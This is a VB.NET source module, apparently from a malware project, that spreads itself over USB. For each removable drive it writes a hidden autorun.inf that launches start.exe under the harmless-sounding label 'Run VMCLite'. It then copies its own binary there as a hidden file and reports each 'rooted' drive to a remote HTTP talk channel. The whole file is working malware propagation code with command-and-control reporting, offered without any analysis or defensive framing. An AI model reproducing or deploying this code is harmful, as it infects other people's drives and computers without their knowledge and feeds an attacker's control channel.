﻿Imports System.IO
Imports Alduin.Stump.Alduin.Stump.Class.Network

Module USBSpread
    Public Sub USBSpreading(ByVal source As String)
        Dim TcpListen As New TcpListen
        Dim drives As DriveInfo() = DriveInfo.GetDrives()
        Try

            For Each drive As DriveInfo In drives

                If drive.DriveType = DriveType.Removable Then
                    Dim autorunPath As String = String.Concat(drive.Name, "autorun.inf")

                    Dim outfile As StreamWriter = New StreamWriter(autorunPath)

                    outfile.WriteLine("[autorun]")
                    outfile.WriteLine("open=start.exe")
                    outfile.WriteLine("action=Run VMCLite")
                    outfile.Close()


                    File.SetAttributes(autorunPath, FileAttributes.Hidden)

                    Try
                        File.Copy(source, String.Concat(drive.Name, "start.exe"), True)

                        File.SetAttributes(String.Concat(drive.Name, "start.exe"), FileAttributes.Hidden)
                    Finally
                        TcpListen.TalkChannelHTTP("Removable device is rooted.")
                    End Try
                End If
            Next

        Catch ex As Exception
            TcpListen.TalkChannelHTTP("Exception: " & ex.ToString())
        End Try
    End Sub
End Module